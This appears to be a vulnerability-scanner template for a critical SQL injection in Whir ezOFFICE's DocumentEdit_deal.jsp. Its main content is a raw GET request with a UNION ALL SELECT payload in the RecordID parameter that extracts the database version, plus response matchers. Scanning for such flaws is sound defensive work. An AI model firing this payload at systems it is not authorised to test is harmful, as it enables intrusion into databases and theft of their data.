id: whir-ezoffice-sql-injection
info:
  name: Whir ezOFFICE SQL Injection
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Whir ezOFFICE DocumentEdit_deal.jsp file has a SQL injection vulnerability in the RecordID parameter, allowing attackers to obtain sensitive database information.
  classification:
    cvss-metrics: "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    cvss-score: 9.0
  tags: sql-injection
  reference:
    - http://www.whir.net/cn/ezofficeqyb/index_52.html
http:
  - raw:
      - |
        GET /defaultroot/public/iWebOfficeSign/DocumentEdit_deal.jsp?RecordID=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,(SELECT%20@@version),NULL,NULL,NULL,NULL,NULL,NULL-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Accept-Encoding: gzip, deflate
        Connection: close
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "Microsoft SQL Server"
          - "MySQL"
      - type: regex
        part: body
        regex:
          - "(?i)(sql syntax|database error|unclosed quotation)"
